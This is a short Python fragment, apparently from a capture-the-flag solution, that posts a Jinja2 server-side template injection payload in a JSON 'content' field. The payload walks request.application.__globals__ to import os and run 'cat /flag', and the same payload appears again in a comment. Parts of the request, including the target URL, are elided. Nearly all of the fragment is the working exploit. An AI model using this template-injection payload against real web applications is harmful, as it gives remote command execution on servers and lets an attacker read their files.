...
# inject {{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read().strip()}}
resp = requests.post(
    ...
    json={
        ...
        "length": 0,
        "content": "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read().strip()}}",
    },
).json()
print(resp)
